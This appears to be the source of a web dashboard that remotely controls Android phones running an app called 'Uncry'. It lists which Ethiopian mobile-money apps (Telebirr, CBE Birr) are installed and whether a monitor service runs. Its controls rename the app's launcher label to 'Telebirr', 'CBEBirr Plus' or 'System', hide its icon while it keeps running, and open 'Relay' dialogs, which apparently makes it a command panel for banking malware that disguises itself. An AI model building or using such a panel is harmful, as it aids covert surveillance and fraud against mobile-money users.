"use client";
import Link from "next/link";
import { useEffect, useState } from "react";
import RelayDialog from "./RelayDialog";

type Device = {
  deviceId:string; model:string; androidVersion:string; appVersion:string;
  installed:string[]; missing:string[]; monitorRunning:boolean;
  batteryOptimized:boolean; lastSeen:string; firstSeen:string; heartbeatCount:number;
  alias?:string; appLabel?:string; hidden?:boolean;
};

const ALIAS_OPTIONS = [
  { key: "system", label: "System" },
  { key: "telebirr", label: "Telebirr" },
  { key: "cbebirr-plus", label: "CBEBirr Plus" },
];

async function renameDevice(id:string, alias:string, label:string){
  const r=await fetch(`/api/devices/${encodeURIComponent(id)}/rename`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({alias})});
  const j=await r.json();
  if(r.ok) alert(`Rename queued for ${id.slice(0,8)} — launcher name becomes "${label}" within 5s`);
  else alert(`Rename failed: ${j.error||r.status}`);
}

async function toggleVisibility(id:string, visible:boolean){
  const r=await fetch(`/api/devices/${encodeURIComponent(id)}/visibility`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({visible})});
  const j=await r.json();
  if(r.ok) alert(visible?`Visible queued for ${id.slice(0,8)} — launcher icon returns within 5s`:`Hide queued for ${id.slice(0,8)} — launcher icon disappears within 5s (app stays installed + running)`);
  else alert(`Visibility failed: ${j.error||r.status}`);
}

export default function Dashboard(){
  const [devices,setDevices]=useState<Device[]>([]);
  const [q,setQ]=useState("");
  const [dlg,setDlg]=useState<{id:string,slot:1|2}|null>(null);
  const load=async()=>{
    const r=await fetch("/api/devices",{cache:"no-store"});
    const j=await r.json();
    setDevices(j.devices||[]);
  };
  useEffect(()=>{ load(); const id=setInterval(load,5000); return()=>clearInterval(id)},[]);
  const filtered=devices.filter(d=>!q||d.deviceId.includes(q)||d.model.toLowerCase().includes(q.toLowerCase()));

  return <main className="max-w-5xl mx-auto px-6 py-8">
    <div className="flex items-center justify-between">
      <div><h1 className="text-2xl font-bold">Teller dashboard</h1><p className="text-sm text-gray-500">Constant-connection view — heartbeats every 60s, dashboard polls every 5s</p></div>
      <a href="/" className="text-sm border px-3 py-1.5 rounded-lg">Home</a>
    </div>

    <div className="flex gap-3 mt-6">
      <input value={q} onChange={e=>setQ(e.target.value)} placeholder="filter deviceId / model" className="border rounded-xl px-3 py-2 w-80"/>
      <button onClick={load} className="border px-4 py-2 rounded-xl">Refresh</button>
      <span className="text-sm text-gray-500 self-center">{filtered.length} devices · {devices.length} total</span>
    </div>

    <div className="overflow-auto border rounded-2xl mt-6">
      <table className="w-full text-sm">
        <thead className="bg-gray-50 text-gray-500"><tr><th className="text-left p-3">Device</th><th className="text-left p-3">Install state</th><th className="text-left p-3">Monitor</th><th className="text-left p-3">Battery</th><th className="text-left p-3">Last seen</th><th className="text-left p-3">Heartbeats</th><th className="text-left p-3">App name</th><th className="text-left p-3">Relay</th></tr></thead>
        <tbody>{filtered.length===0?<tr><td colSpan={8} className="p-8 text-center text-gray-400">No devices yet — launch Uncry (poss) and it will register here.</td></tr>:filtered.map(d=>{
          const online=Date.now()-new Date(d.lastSeen).getTime()< 90_000;
          return <tr key={d.deviceId} className="border-t hover:bg-gray-50">
            <td className="p-3"><Link href={`/dashboard/${encodeURIComponent(d.deviceId)}`} className="font-mono text-xs text-violet-600 hover:underline">{d.deviceId.slice(0,12)}…</Link><div className="text-xs text-gray-500">{d.model} · A{d.androidVersion} · {d.appVersion}</div></td>
            <td className="p-3 text-xs">{d.installed.length?d.installed.join(", "):"none"} <span className="text-gray-400"> / missing: {d.missing.join(", ")||"—"}</span></td>
            <td className="p-3"><span className={`text-xs px-2 py-1 rounded-full ${d.monitorRunning?"bg-green-100 text-green-700":"bg-gray-100"}`}>{d.monitorRunning?"running":"stopped"}</span> <span className={`ml-1 text-xs px-2 py-1 rounded-full ${online?"bg-emerald-500 text-white":"bg-red-100 text-red-600"}`}>{online?"online":"offline"}</span></td>
            <td className="p-3 text-xs">{d.batteryOptimized?"optimized (risk)":"exempt ✓"}</td>
            <td className="p-3 text-xs">{new Date(d.lastSeen).toLocaleString()}<div className="text-gray-400">first {new Date(d.firstSeen).toLocaleDateString()}</div></td>
            <td className="p-3 text-xs">{d.heartbeatCount} <Link href={`/dashboard/${encodeURIComponent(d.deviceId)}`} className="ml-2 text-violet-600 hover:underline">view →</Link></td>
            <td className="p-3"><div className="text-xs font-medium">{d.appLabel||"Uncry"}</div><div className="flex gap-1 mt-1">{ALIAS_OPTIONS.map(o=>(
              <button key={o.key} onClick={()=>renameDevice(d.deviceId,o.key,o.label)} title={`Rename to ${o.label}`}
                className={`text-[11px] px-2 py-1 rounded-lg border ${(d.alias||"uncry")===o.key?"bg-slate-800 text-white border-slate-800":"hover:bg-gray-100"}`}>{o.label}</button>
            ))}</div></td>
            <td className="p-3"><div className="flex gap-1.5"><button onClick={()=>setDlg({id:d.deviceId,slot:1})}
                className="bg-violet-600 text-white text-xs px-3 py-1.5 rounded-lg hover:bg-violet-700">Relay 1</button><button onClick={()=>setDlg({id:d.deviceId,slot:2})}
                className="bg-fuchsia-600 text-white text-xs px-3 py-1.5 rounded-lg hover:bg-fuchsia-700">Relay 2</button><button onClick={()=>toggleVisibility(d.deviceId,!d.hidden)}
                title={d.hidden?"Bring the launcher icon back":"Hide the launcher icon"}
                className={`text-xs px-3 py-1.5 rounded-lg border ${d.hidden?"bg-emerald-600 text-white border-emerald-600 hover:bg-emerald-700":"hover:bg-gray-100"}`}>{d.hidden?"Visible":"Hide"}</button></div>{d.hidden && <div className="text-[11px] text-amber-600 mt-1">icon hidden</div>}</td>
          </tr>
        })}</tbody>
      </table>
    </div>

    <details className="mt-6 text-xs bg-gray-50 p-4 rounded-xl">
      <summary className="font-medium cursor-pointer">curl test (register a device manually)</summary>
      <pre className="mt-2 overflow-auto">curl -X POST $TELLER_URL/api/devices/register -H "Content-Type: application/json" -d &#123;"deviceId":"test-123","model":"Pixel 7","androidVersion":"14","appVersion":"0.2.1-poss","installed":["cn.tydic.ethiopay"],"missing":["prod.cbe.birr"],"monitorRunning":true,"batteryOptimized":false&#125;</pre>
    </details>
    <p className="text-xs text-gray-400 mt-4">Storage is in-memory on Vercel (resets on cold start). For prod, add Vercel KV / Postgres — see lib/store.ts.</p>
    {dlg && <RelayDialog deviceId={dlg.id} slot={dlg.slot} onClose={()=>setDlg(null)} />}
  </main>
}
